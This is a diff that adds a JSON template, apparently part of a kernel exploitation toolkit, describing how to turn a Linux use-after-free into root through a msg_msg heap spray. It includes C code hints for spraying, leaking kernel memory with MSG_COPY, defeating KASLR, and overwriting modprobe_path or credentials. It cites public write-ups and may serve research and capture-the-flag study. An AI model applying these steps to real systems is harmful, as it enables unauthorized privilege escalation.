@@ -1,0 +1,56 @@
+{
+  "name": "msg_msg_uaf",
+  "description": "UAF exploited via msg_msg heap spray. The msg_msg structure (variable-length, 48-byte header) is allocated from kmalloc-64 through kmalloc-4k depending on payload. Corrupt msg_msg.m_list.next to achieve arbitrary read via MSG_COPY, then derive arbitrary write for privilege escalation.",
+  "target_struct": "msg_msg",
+  "slab_cache": "kmalloc-64 to kmalloc-4k (size-dependent)",
+  "technique": "msg_msg_list_corruption",
+  "vuln_types": ["uaf", "heap-out-of-bounds"],
+  "kernel_versions": "4.9+",
+  "detection_rules": {
+    "required_symbols": ["msgsnd", "msgrcv", "msgget"],
+    "crash_functions": ["copy_msg", "load_msg", "store_msg", "free_msg", "do_msgsnd", "do_msgrcv"],
+    "slab_caches": ["kmalloc-64", "kmalloc-128", "kmalloc-256", "kmalloc-512", "kmalloc-1k", "kmalloc-4k"],
+    "struct_fields": ["msg_msg.m_list", "msg_msg.m_ts", "msg_msg.next", "msg_msgseg.next"]
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the use-after-free to free the target object while a dangling reference remains",
+      "code_hint": "// Trigger the vulnerability to free the target object\n// The specific trigger depends on the CVE"
+    },
+    {
+      "name": "spray_msg_msg",
+      "description": "Spray msg_msg objects via msgsnd() to reclaim the freed slab. Size the payload so msg_msg lands in the same kmalloc bucket as the freed object.",
+      "code_hint": "#define SPRAY_COUNT 128\nstruct { long mtype; char mtext[TARGET_SIZE - 48]; } msg;\nmsg.mtype = 1;\nfor (int i = 0; i < SPRAY_COUNT; i++) {\n    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);\n    memset(msg.mtext, 'A', sizeof(msg.mtext));\n    msgsnd(qid, &msg, sizeof(msg.mtext), 0);\n}"
+    },
+    {
+      "name": "corrupt_msg_next_ptr",
+      "description": "Use the dangling pointer to overwrite msg_msg.m_list.next, pointing it to a target kernel address for read/write.",
+      "code_hint": "// Write through dangling pointer to corrupt msg_msg.m_list.next\n// Set next to point to target address - 8 (accounting for m_list offset)"
+    },
+    {
+      "name": "leak_via_msg_copy",
+      "description": "Use MSG_COPY flag with msgrcv() to read through the corrupted msg_msg chain, leaking kernel memory at the target address.",
+      "code_hint": "char leak_buf[8192];\nmsgrcv(qid, leak_buf, sizeof(leak_buf), 0, MSG_COPY | IPC_NOWAIT);\n// Parse leak_buf to extract kernel pointers"
+    },
+    {
+      "name": "bypass_kaslr",
+      "description": "Parse leaked kernel pointers to compute KASLR base. Look for function pointers or vtable entries that reveal the kernel text base.",
+      "code_hint": "// Scan leaked data for kernel text pointers (0xffffffff8XXXXXXX on x86_64)\nunsigned long *ptrs = (unsigned long *)leak_buf;\nfor (int i = 0; i < leak_len/8; i++) {\n    if ((ptrs[i] >> 36) == 0xffffffff8UL) {\n        kernel_base = ptrs[i] - KNOWN_OFFSET;\n        break;\n    }\n}"
+    },
+    {
+      "name": "derive_arb_write",
+      "description": "Build a second corrupted msg_msg chain or use the leak to forge a write primitive. Techniques include corrupting msg_msg.next to point to a fake msg_msgseg that overlaps a target.",
+      "code_hint": "// Overwrite msg_msg.next to point to fake msg_msgseg\n// When kernel copies message data, it writes to our target"
+    },
+    {
+      "name": "overwrite_modprobe_path",
+      "description": "Use arbitrary write to overwrite modprobe_path or current task's creds for privilege escalation.",
+      "code_hint": "// Option A: Overwrite modprobe_path\nchar payload[] = \"/tmp/pwn\\x00\";\narb_write(kernel_base + MODPROBE_PATH_OFFSET, payload, sizeof(payload));\n// Then trigger modprobe by executing unknown binary format\n\n// Option B: Overwrite current->cred->uid\narb_write(current_cred + CRED_UID_OFFSET, \"\\x00\\x00\\x00\\x00\", 4);"
+    }
+  ],
+  "references": [
+    "https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html",
+    "https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html"
+  ]
+}
